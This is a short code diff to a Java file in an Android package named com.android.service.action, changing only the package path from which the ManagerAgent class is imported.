@@ -11,9 +11,9 @@ package com.android.service.action;
 
 import org.json.JSONObject;
 
-import com.android.service.agent.ManagerAgent;
 import com.android.service.auto.Cfg;
 import com.android.service.conf.ConfAction;
+import com.android.service.manager.ManagerAgent;
 import com.android.service.util.Check;
 
 /**
